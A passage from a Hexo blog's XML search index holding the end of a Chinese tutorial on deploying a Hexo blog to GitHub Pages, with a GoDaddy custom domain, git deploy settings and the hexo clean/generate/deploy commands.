key。登录GitHub。对刚刚新建的库（账号名.github.io）进行设置。将Custom domain设置为从GoDaddy申请的域名。站点部署配置站点配置文件的Deployment字段，将其修改。1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master如果出现Deployer not found，请输入1E:\hexo\blog\npm install hexo-deployer-git --save上传blog。123E:\hexo\blog\hexo cleanE:\hexo\blog\hexo gE:\hexo\blog\hexo d完成这时候通过账户名.github.io 或者 申请的域名即可访问你的博客了！！]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
